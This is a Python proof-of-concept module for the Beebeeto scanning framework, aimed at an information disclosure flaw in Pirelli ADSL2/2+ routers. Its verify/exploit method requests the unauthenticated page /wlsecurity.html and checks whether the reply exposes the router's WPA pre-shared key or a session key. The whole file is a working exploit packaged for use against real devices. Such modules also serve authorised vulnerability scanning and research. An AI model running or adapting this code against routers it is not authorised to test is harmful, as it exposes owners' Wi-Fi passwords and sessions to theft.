#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0004',
            'name': 'Pirelli ADSL2/2+ Wireless Router P.DGA4001N 信息泄漏漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-01-08',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Pirelli',
            'vul_version': ['ADSL2/2+'],
            'type': 'Information Disclosure',
            'tag': ['Pirelli路由漏洞', 'Pirelli信息泄漏漏洞', '/wlsecurity.html'],
            'desc': 'Tested on firmware version PDG_TEF_SP_4.06L.6',
            'references': ['http://www.exploit-db.com/exploits/35721/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = "%s/wlsecurity.html" % args['options']['target']
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "var wpaPskKey = '" in content or "var sessionKey" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())